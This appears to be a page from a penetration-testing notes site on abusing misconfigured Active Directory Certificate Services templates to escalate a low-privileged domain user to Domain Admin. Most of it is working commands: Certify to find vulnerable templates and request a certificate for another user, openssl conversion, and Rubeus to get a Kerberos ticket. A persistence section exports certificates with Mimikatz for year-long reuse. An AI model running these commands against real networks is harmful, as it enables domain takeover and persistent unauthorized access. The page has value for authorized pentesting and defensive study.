---
layout: default
title: Certificate Services
parent: Active Directory
nav_order: 1
permalink: /ad/certs/
---

# Certificate Services
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Active Directory Certificate Services uses certificate templates that are provided by Microsoft. The purpose of these templates it to be duplicated before configured. It exists misconfigurations in these templates that could be abused if not corrected when configured to escalate your privileges.

## Prerequisites

* Low privileged domain user.

## Exploit

First, list vulnerable certificate templates with [Certify](https://github.com/GhostPack/Certify).

```powershell
./Certify.exe find /vulnerable
```

To continue this exploit, previous command should output `[!] Vulnerable Certificates Templates` with following conditions:
* `msPKI-Certificate-Name-Flag` must be set to `ENROLLEE_SUPPLIES_SUBJECT` to allow the requestor to provide any Subject Alternative Name.
* `pkiextendedkeyusage` must contain `Client Authentication`.
* `Enrollment Rights` must contain a group in which you have compromised a user.

With all this prerequisites, you can request an authentication certificate for any other domain user, including Domain Admin.

```powershell
# Request a certificate for the target user.
./Certify.exe request /ca:$CAName /template:$TemplateName /altname:$TargetUser

# Convert the entire certificate (private key + certificate = cert.pem) so it can be used by Rubeus.
# Setup the password you want during the process.
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
cat cert.pfx | base64 -w 0

# Then ask a TGT for the target user.
./Rubeus.exe asktgt /user:$TargetUser /certificate:$Base64EncodedCertificate /password:$Password /nowrap
```

## Persistence

Once local administrator - *or Domain Admin* - you can export certificates to authenticate with later. User certificates are valid **1 year** by default, so enjoy it! To list certificates, use [Seatbelt](https://github.com/GhostPack/Seatbelt) or in `Certificates - Current User\Personal\Certificates\`.

```powershell
# List certificates and make sure certificate is used for client authentication.
./Seatbelt.exe Certificates

# Export certificates with Mimikatz (certificate's password is `mimikatz` in this case).
crypto::certificates /export

# Encode exported certificate.
cat cert.pfx | base64 -w 0

# Ask TGT with Rubeus.
./Rubeus.exe asktgt /user:$TargetUser /certificate:$Base64EncodedCertificate /password:mimikatz /nowrap
```